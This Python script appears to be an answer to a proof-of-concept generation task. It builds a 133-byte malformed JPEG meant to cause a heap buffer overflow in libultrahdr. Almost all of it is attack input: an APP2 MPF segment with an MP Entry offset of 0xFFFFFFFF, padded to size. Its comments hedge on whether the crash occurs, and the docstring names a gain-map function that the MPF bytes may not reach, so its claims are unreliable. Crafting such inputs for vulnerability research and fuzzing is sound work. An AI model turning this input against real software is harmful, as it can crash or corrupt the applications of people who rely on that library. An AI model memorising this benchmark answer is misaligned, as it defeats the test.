import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in decodeGainmapMetadata.
        The vulnerability corresponds to an issue in libultrahdr's MPF/Gainmap parsing
        where unsigned subtraction leads to out-of-bounds access.
        
        Targeting a 133-byte JPEG file with a malicious APP2 MPF segment.
        """
        
        # 1. JPEG SOI (Start of Image) - 2 bytes
        poc = bytearray(b'\xff\xd8')
        
        # 2. APP2 Marker - 2 bytes
        poc.extend(b'\xff\xe2')
        
        # 3. Length of APP2 segment - 2 bytes
        # Total file size target: 133 bytes.
        # Current size: 2 (SOI) + 2 (Marker) = 4 bytes.
        # Remaining needed: 129 bytes.
        # The Length field value includes the 2 bytes of the length field itself.
        # So payload size must be 129 - 2 = 127 bytes.
        # Length field value = 127 + 2 = 129 (0x0081).
        poc.extend(b'\x00\x81')
        
        # 4. Payload - 127 bytes
        # MPF Signature ("MPF\0") - 4 bytes
        poc.extend(b'MPF\x00')
        
        # TIFF Header - 8 bytes
        # Byte Order: Little Endian (0x4949)
        # Signature: 42 (0x002A)
        # Offset to 0th IFD: 8 (0x00000008) - points to immediately after this header
        poc.extend(b'\x49\x49\x2a\x00\x08\x00\x00\x00')
        
        # IFD Structure
        # Entry Count: 1 - 2 bytes
        poc.extend(b'\x01\x00')
        
        # Entry 0: 12 bytes
        # Tag: 0xB002 (MP Entry)
        # Type: 7 (Undefined)
        # Count: 16
        # Value/Offset: 0xFFFFFFFF (Malicious offset to trigger overflow)
        # Since Count (16) * sizeof(Type 7) (1) = 16 bytes > 4 bytes, this field is an offset.
        # A large offset like 0xFFFFFFFF often triggers wrap-around logic in size calculations
        # or points to invalid memory.
        poc.extend(b'\x02\xb0\x07\x00\x10\x00\x00\x00\xff\xff\xff\xff')
        
        # Next IFD Offset: 0 (End) - 4 bytes
        poc.extend(b'\x00\x00\x00\x00')
        
        # Current Payload Size: 4 + 8 + 2 + 12 + 4 = 30 bytes
        # Padding needed: 127 - 30 = 97 bytes
        poc.extend(b'\x00' * 97)
        
        return bytes(poc)
